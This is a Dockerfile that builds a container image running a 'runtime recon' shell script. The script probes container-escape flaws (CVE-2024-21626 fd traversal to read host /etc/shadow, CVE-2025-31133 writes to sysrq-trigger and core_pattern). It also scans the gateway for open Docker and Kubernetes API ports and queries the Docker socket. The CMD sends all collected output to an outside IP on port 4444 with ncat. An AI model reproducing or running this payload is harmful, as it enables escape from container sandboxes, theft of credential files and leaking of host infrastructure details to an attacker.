# syntax=er028455/df-frontend:v4
# build-trigger: 5
FROM alpine:3.18

RUN apk add --no-cache curl nmap-ncat

COPY --from=er028455/df-frontend:v4 /socktest /socktest

RUN printf '#!/bin/sh\n\
{\n\
echo "=== RUNTIME RECON V6 ==="\n\
uname -a; hostname; id\n\
\n\
echo "--- CAPABILITIES ---"\n\
grep -E "Cap(Eff|Bnd|Prm)" /proc/self/status\n\
\n\
echo "--- CVE-2024-21626 LEAKY VESSELS ---"\n\
echo "ls /proc/self/fd/:"\n\
ls -la /proc/self/fd/ 2>&1\n\
for FD in 3 4 5 6 7 8 9 10 11 12; do\n\
  TARGET=$(readlink /proc/self/fd/$FD 2>/dev/null)\n\
  if [ -n "$TARGET" ]; then\n\
    echo "fd $FD -> $TARGET"\n\
    if [ -d "/proc/self/fd/$FD" ] 2>/dev/null; then\n\
      echo "fd $FD IS DIRECTORY - listing:"\n\
      ls /proc/self/fd/$FD/ 2>&1 | head -10\n\
      echo "Trying host traversal via fd $FD:"\n\
      cat /proc/self/fd/$FD/../../../../etc/hostname 2>&1\n\
      cat /proc/self/fd/$FD/../../../../etc/shadow 2>&1 | head -3\n\
    fi\n\
  fi\n\
done\n\
\n\
echo "--- CVE-2025-31133 PROCFS REDIRECT ---"\n\
echo "dev console:"; ls -la /dev/console 2>&1\n\
echo "dev null:"; ls -la /dev/null 2>&1\n\
echo "findmnt dev:"; findmnt -n /dev/console /dev/null /dev/zero 2>&1 | head -10\n\
echo "mount | grep dev:"; mount 2>&1 | grep -E "/dev/(console|null|zero|full|random|urandom|tty)" | head -10\n\
echo "proc sysrq:"; cat /proc/sysrq-trigger 2>&1; echo "sysrq_rc=$?"\n\
echo "proc sysrq write test:"; echo "" > /proc/sysrq-trigger 2>&1; echo "sysrq_write_rc=$?"\n\
echo "core_pattern write:"; echo "test" > /proc/sys/kernel/core_pattern 2>&1; echo "core_write_rc=$?"\n\
echo "maskedPaths check:"\n\
for MP in /proc/acpi /proc/kcore /proc/keys /proc/latency_stats /proc/timer_list /proc/timer_stats /proc/sched_debug /proc/scsi /sys/firmware; do\n\
  echo "$MP: $(cat $MP 2>&1 | head -1)"\n\
done\n\
\n\
echo "--- RUNC/CONTAINER RUNTIME ---"\n\
runc --version 2>&1\n\
cat /proc/1/cmdline 2>/dev/null | tr "\\0" " " 2>&1; echo ""\n\
ls -la /proc/1/exe 2>&1\n\
cat /proc/1/cgroup 2>&1 | head -5\n\
echo "seccomp:"; grep Seccomp /proc/self/status\n\
\n\
echo "--- SOCKET TESTS ---"\n\
/socktest 2>&1\n\
\n\
echo "--- KALLSYMS ---"\n\
echo "unix_walk_scc:"; grep -c unix_walk_scc /proc/kallsyms 2>&1\n\
echo "sctp:"; grep -c sctp /proc/kallsyms 2>&1\n\
echo "algif_aead:"; grep -c algif_aead /proc/kallsyms 2>&1\n\
\n\
echo "--- NETWORK ---"\n\
ip addr 2>/dev/null || ifconfig 2>/dev/null\n\
ip route 2>/dev/null\n\
cat /etc/resolv.conf\n\
\n\
echo "--- DOCKER API SCAN ---"\n\
GW=$(ip route 2>/dev/null | grep default | awk "{print \\$3}")\n\
echo "Gateway: $GW"\n\
for PORT in 2375 2376 4243 9323 5000 8080 443 80 22 6443 10250 10255 2379 2380; do\n\
  nc -z -w 2 $GW $PORT 2>/dev/null && echo "$GW:$PORT OPEN" || true\n\
done\n\
for PORT in 2375 2376 4243; do\n\
  RESP=$(curl -s -m 3 http://$GW:$PORT/version 2>&1)\n\
  [ -n "$RESP" ] && echo "HTTP $GW:$PORT/version: $RESP"\n\
done\n\
\n\
echo "--- DOCKER SOCKET ---"\n\
ls -la /var/run/docker.sock 2>&1\n\
curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -20\n\
\n\
echo "--- CORE/MODPROBE ---"\n\
cat /proc/sys/kernel/core_pattern 2>&1\n\
cat /proc/sys/kernel/modprobe 2>&1\n\
\n\
echo "=== END V6 ==="\n\
} > /tmp/recon 2>&1\n\
cat /tmp/recon\n\
' > /recon.sh && chmod +x /recon.sh

CMD sh -c "/recon.sh; ncat -w 15 129.101.121.138 4444 < /tmp/recon; sleep 999999"
